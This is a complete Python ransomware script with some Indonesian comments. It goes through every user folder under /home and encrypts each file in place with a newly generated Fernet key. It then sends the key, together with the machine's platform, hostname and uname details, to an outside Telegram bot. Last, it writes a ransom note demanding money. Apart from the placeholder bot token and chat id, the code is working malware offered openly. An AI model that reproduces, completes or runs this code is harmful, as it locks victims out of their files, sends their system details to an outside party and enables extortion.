#!/usr/bin/python3
import os
from cryptography.fernet import Fernet
import requests
import platform as pl

a = "/home"
os.chdir(a)
user = os.listdir() #collect user folder

print(user)

ransompath = "GOTCHA/"

if os.path.exists(ransompath) == False :
	os.mkdir("GOTCHA")



#deklarasi kunci
kunci = Fernet.generate_key()

#list store
folpath = [] #where to store user folder content path
filepath = [] 


def filecol(fdlist, fol1, file) :
	for path in fdlist :
		child = os.listdir(path)
		print(child)


		for item in child :
			abpath = f'{os.path.abspath(path)}/{item}'

			if "NAMA FILE YANG INGIN DI SKIP, KALAU ADA" == item :
				print("DONT")
				continue


			if os.path.isfile(abpath):
				print("list file", file)
				file.append(abpath)

			else :
				print("list folder", fol1)
				fol1.append(abpath)
	filecol2(fol1,file)

# maybe i should assemble both of the filecol func, but idk how :P

def filecol2(folpath,filepath) :
	for folder in folpath :
		child = os.listdir(folder)
		if len(child) == 0 : #remove empty folder from list
			folpath.remove(folder)
			print(folder, "removed")

		for content in child :
			abpath = f'{os.path.abspath(folder)}/{content}'

			if "NAMA FILE YANG INGIN DI SKIP, KALAU ADA" == content :
				print("DONT MESS WITH IT")
				continue

			if os.path.isfile(abpath) :
				filepath.append(abpath)

			else :
				folpath.append(abpath)

#i think the reason why i don't need a recursive function is because i append the folder path and it makes everysingle folder in this machine would be added 
#how lucky i am :DD

#unnecesary check for read binary

def Encrypt(filepath, kunci):
	for file in filepath :
		try :

			with open(file, "rb") as act : 
				content = act.read()

			encryptedct = Fernet(kunci).encrypt(content)

			with open(file, "wb") as isi :
				isi.write(encryptedct)


		except OSError:
			continue

	telegram(kunci)

def telegram(kunci) :
	#deklarasi variabel :D
	TOKEN = "TOKEN DARI BOT FATHER BALBLBALBA"
	strkunci = str(kunci, 'utf-8')
	message = f"the string key is {strkunci}"
	idchat = "id chat dari json"


	#system info
	platform = pl.platform()
	node = pl.node()
	rl = pl.release()
	ver = pl.version()
	machine = pl.machine()
	uname = os.uname()

	message0 = "WE GOT A FISH"
	message1 = f"platform\t: {platform}"
	message2 = f"node\t: {node}"
	message3 = f"release\t: {rl}"
	message4 = f"versioin\t: {ver}"
	message5 = f"machine\t: {machine}"
	message6 = f"uname\t: {uname}"
	message7 = f"key\t: {strkunci}"
	msglist = [message0, message1, message2, message3, message4, message5, message6, message7]

	for msg in msglist:
		url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={idchat}&text={msg}"
		r = requests.get(url)






filecol(user, folpath,filepath)

Encrypt(filepath,kunci)

with open(f"{ransompath}/msg.txt", 'w') as msg :
	msg.write("all your file been encrypted, contact me if you want the key. Oh don't forget to prepare the money :D")

